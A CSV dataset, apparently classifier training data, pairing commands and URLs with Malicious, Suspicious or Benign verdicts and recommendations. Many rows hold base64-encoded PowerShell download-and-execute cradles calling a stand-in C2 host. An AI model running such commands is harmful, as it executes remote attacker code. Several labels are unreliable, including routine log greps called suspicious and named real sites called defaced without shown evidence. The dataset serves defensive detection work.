input_text,target_text
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDI2LmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzkyODcucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: happylivingdesign.com/curb_appeal/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: grep -ai 'userd' /var/log/auth.log,"Suspicious - Searches authentication logs for hex-encoded or obfuscated usernames, may indicate log tampering or access checking. Recommendation: Investigate user and correlate with system access events."
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDQxLmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzYxNzIucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: grep -ai 'user1' /var/log/auth.log,"Suspicious - Searches authentication logs for hex-encoded or obfuscated usernames, may indicate log tampering or access checking. Recommendation: Investigate user and correlate with system access events."
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDUuYzItb2JmdXNjYXRlZC5pby91cGRhdGVfNzc1Ny5wczEnKQ==,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: gzip -c ~/logs/session_23.log > ~/logs/archive/session_23.log.gz,Benign - Compresses logs into an archive for safe storage — routine admin operation. Recommendation: No action needed.
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDQ0LmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzMxMzcucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDYuYzItb2JmdXNjYXRlZC5pby91cGRhdGVfMzIyMy5wczEnKQ==,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDkuYzItb2JmdXNjYXRlZC5pby91cGRhdGVfMjExNS5wczEnKQ==,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: grep -ai 'user22' /var/log/auth.log,"Suspicious - Searches authentication logs for hex-encoded or obfuscated usernames, may indicate log tampering or access checking. Recommendation: Investigate user and correlate with system access events."
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDM3LmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzg4MTcucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: grep -ai 'user9' /var/log/auth.log,"Suspicious - Searches authentication logs for hex-encoded or obfuscated usernames, may indicate log tampering or access checking. Recommendation: Investigate user and correlate with system access events."
analyze: grep -ai 'user1a' /var/log/auth.log,"Suspicious - Searches authentication logs for hex-encoded or obfuscated usernames, may indicate log tampering or access checking. Recommendation: Investigate user and correlate with system access events."
analyze: grep -ai 'user5' /var/log/auth.log,"Suspicious - Searches authentication logs for hex-encoded or obfuscated usernames, may indicate log tampering or access checking. Recommendation: Investigate user and correlate with system access events."
analyze: http://www.iamboo.it/en/news,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDIuYzItb2JmdXNjYXRlZC5pby91cGRhdGVfMTQ4NS5wczEnKQ==,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDIxLmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzY0NzYucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: grep -ai 'userc' /var/log/auth.log,"Suspicious - Searches authentication logs for hex-encoded or obfuscated usernames, may indicate log tampering or access checking. Recommendation: Investigate user and correlate with system access events."
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDI0LmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzI5NjYucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDY1LmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzEzODUucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: pacific-time.info/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: http://pembrokeshire-farm-cottages.co.uk/terms.html,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: gzip -c ~/logs/session_11.log > ~/logs/archive/session_11.log.gz,Benign - Compresses logs into an archive for safe storage — routine admin operation. Recommendation: No action needed.
analyze: mojopages.com/biz/ktrb-radio-am-860/san-francisco/ca/94111/20082692,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDY0LmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzkxODEucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: thetravelingwheelchair.com/aldi-food-market-in-raynham/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: greatsitkin.org/UnrepShips.html,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDExLmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzYxMzkucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: gzip -c ~/logs/session_33.log > ~/logs/archive/session_33.log.gz,Benign - Compresses logs into an archive for safe storage — routine admin operation. Recommendation: No action needed.
analyze: manta.com/c/mth8wnm/minnesota-valley-health-center,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: grep -ai 'user15' /var/log/auth.log,"Suspicious - Searches authentication logs for hex-encoded or obfuscated usernames, may indicate log tampering or access checking. Recommendation: Investigate user and correlate with system access events."
analyze: gzip -c ~/logs/session_10.log > ~/logs/archive/session_10.log.gz,Benign - Compresses logs into an archive for safe storage — routine admin operation. Recommendation: No action needed.
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDY5LmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzU1MjcucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: grep -ai 'user12' /var/log/auth.log,"Suspicious - Searches authentication logs for hex-encoded or obfuscated usernames, may indicate log tampering or access checking. Recommendation: Investigate user and correlate with system access events."
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDYxLmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzg0MDUucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: grep -ai 'user27' /var/log/auth.log,"Suspicious - Searches authentication logs for hex-encoded or obfuscated usernames, may indicate log tampering or access checking. Recommendation: Investigate user and correlate with system access events."
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDQzLmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzk0ODYucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDEuYzItb2JmdXNjYXRlZC5pby91cGRhdGVfNzk3MS5wczEnKQ==,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: imdb.com/name/nm0422409/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDU2LmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzI2NjUucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: grep -ai 'user25' /var/log/auth.log,"Suspicious - Searches authentication logs for hex-encoded or obfuscated usernames, may indicate log tampering or access checking. Recommendation: Investigate user and correlate with system access events."
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDYzLmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzYwMTIucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: grep -ai 'user3' /var/log/auth.log,"Suspicious - Searches authentication logs for hex-encoded or obfuscated usernames, may indicate log tampering or access checking. Recommendation: Investigate user and correlate with system access events."
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDIzLmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzk3NDYucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDQwLmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzQxNzcucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: grep -ai 'user21' /var/log/auth.log,"Suspicious - Searches authentication logs for hex-encoded or obfuscated usernames, may indicate log tampering or access checking. Recommendation: Investigate user and correlate with system access events."
